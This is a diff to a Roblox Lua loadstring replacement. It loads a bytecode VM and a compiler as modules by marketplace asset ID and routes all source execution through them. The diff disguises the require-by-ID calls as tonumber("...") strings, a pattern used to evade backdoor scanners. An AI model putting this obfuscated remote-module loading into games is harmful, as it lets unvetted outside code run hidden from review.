@@ -1,7 +1,7 @@
 local _env = getfenv()
 
 local createExecutable = function(bCode, env)
-    fione = require(100935166061231)
+    fione = require(tonumber("100935166061231"))
     return fione.wrap_lua(fione.stm_lua(bCode), env or _env)
 end
 
@@ -10,7 +10,7 @@ local ls = function(source, env)
     local env = env or _env
     local name = (env.script and env.script:GetFullName())
 
-    compile = require(125795446062284)
+    compile = require(tonumber("125795446062284"))
     local ran, failureReason = pcall(function()
         local compiledBytecode = compile(source, name)
         executable = createExecutable(compiledBytecode, env)
@@ -33,14 +33,8 @@ local function fixenv()
 end
 
 local run = function(source)
-    local o
-    local loadstringEnabled = pcall(function() loadstring("_ = true")() end)
     fixenv()
-    if not loadstringEnabled then
-        o = ls(source)()
-    else
-        o = loadstring(source)()
-    end
+    ls(source)()
     fixenv()
     
     return function()
